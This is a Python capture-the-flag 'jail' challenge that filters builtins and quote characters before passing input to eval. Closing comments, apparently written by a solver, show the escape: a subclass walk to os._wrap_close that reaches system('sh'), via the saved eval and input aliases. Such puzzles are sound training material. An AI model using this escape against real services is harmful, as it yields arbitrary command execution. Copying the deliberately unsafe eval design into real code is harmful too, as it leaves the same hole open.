BANLIST = ['__loader__', '__import__', 'compile', 'eval', 'exec', 'chr','input','locals','globals','bytes','type','open']
 
my_eval_func_002EFCDB = eval
my_input_func_000FDCAB = input
 
for m in BANLIST:
    del __builtins__.__dict__[m]
 
del __loader__, __builtins__
 
def filter(s):
    not_allowed = set('"\'`+')
    return any(c in not_allowed for c in s)
 
def main():
    WELCOME = '''
  _                _                           _       _ _   _                _ _  _   ____
 | |              (_)                         (_)     (_) | | |              | | || | |___ \
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ <
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/
              __/ |                          _/ |
             |___/                          |__/
 
    '''
 
    print(WELCOME)
 
    print("Welcome to the python jail")
    print("Let's have an beginner jail of calc")
    print("Enter your expression and I will evaluate it for you.")
    print("Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,\",',+ Good luck!")
    input_data = my_input_func_000FDCAB("> ")
    if filter(input_data):
        print("Oh hacker!")
        exit(0)
    print('Answer: {}'.format(my_eval_func_002EFCDB(input_data)))
 
if __name__ == '__main__':
    main()


# here bytes is block, so I can not use open
# but I can use __class__ and find the object for os._wrap_close_
# to find that I can use sysfinder tool or like below:
# clsss = "".__class__.__base__.__subclasses__()
# [(i, x) for i, x in enumerate(clsss) if "os" in x.__name__]
# then I can use the my_eval_func(my_input_func)
#  my_eval_func_002EFCDB(my_input_func_000FDCAB())
#  ().__class__.__base__.__subclasses__()[154].__init__.__globals__['system']("sh")